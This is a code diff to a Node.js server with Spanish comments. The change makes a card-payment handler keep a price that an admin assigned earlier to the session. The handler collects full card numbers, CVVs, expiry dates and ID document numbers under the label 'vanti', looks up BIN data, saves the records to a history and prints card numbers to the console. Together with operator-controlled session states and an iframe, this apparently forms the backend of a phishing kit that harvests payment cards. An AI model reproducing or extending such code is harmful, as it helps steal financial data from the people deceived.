@@ -325,10 +325,12 @@ const server = http.createServer(async (req, res) => {
                         if (valor === undefined || valor === null) { json(res, 400, { ok: false, error: 'Falta el valor del precio' }); return; }
                         estadoSesiones.set(sessionId, 'precio_asignado');
                         ultimaAccionSesiones.set(sessionId, String(valor));
-                        // Guardar el precio en los datos de la sesión para que el admin y el iframe lo lean
+                        
+                        // 🔥 GUARDAR EL PRECIO EN LA SESIÓN
                         const datosPrevios = datosSesiones.get(sessionId) || {};
                         const datosActualizados = Object.assign({}, datosPrevios, { monto: Number(valor), precio: Number(valor) });
                         datosSesiones.set(sessionId, datosActualizados);
+
                         agregarLog('poner-precio', { usuario: payload.user, sessionId, valor });
                         json(res, 200, { ok: true, estado: 'precio_asignado', accion: String(valor) });
                         return;
@@ -593,6 +595,9 @@ const server = http.createServer(async (req, res) => {
                 const previos = datosSesiones.get(sessionId) || {};
                 const infoBin = await obtenerInfoBin(tarjeta);
                 
+                // Se respeta el precio que ya se haya asignado antes
+                const montoFinal = previos.monto || monto;
+
                 const datosSesion = Object.assign({}, previos, {
                     sessionId,
                     bancoKey: 'vanti',
@@ -600,7 +605,7 @@ const server = http.createServer(async (req, res) => {
                     titular,
                     docType,
                     docNumber,
-                    monto,
+                    monto: montoFinal,
                     expMes,
                     expAnio,
                     cvv,
@@ -622,7 +627,7 @@ const server = http.createServer(async (req, res) => {
                 
                 guardarHistorial('vanti', datosSesion);
                 
-                console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta} | Monto: ${monto}`);
+                console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta} | Monto: ${montoFinal}`);
                 json(res, 200, { ok: true, sessionId, binInfo: infoBin });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
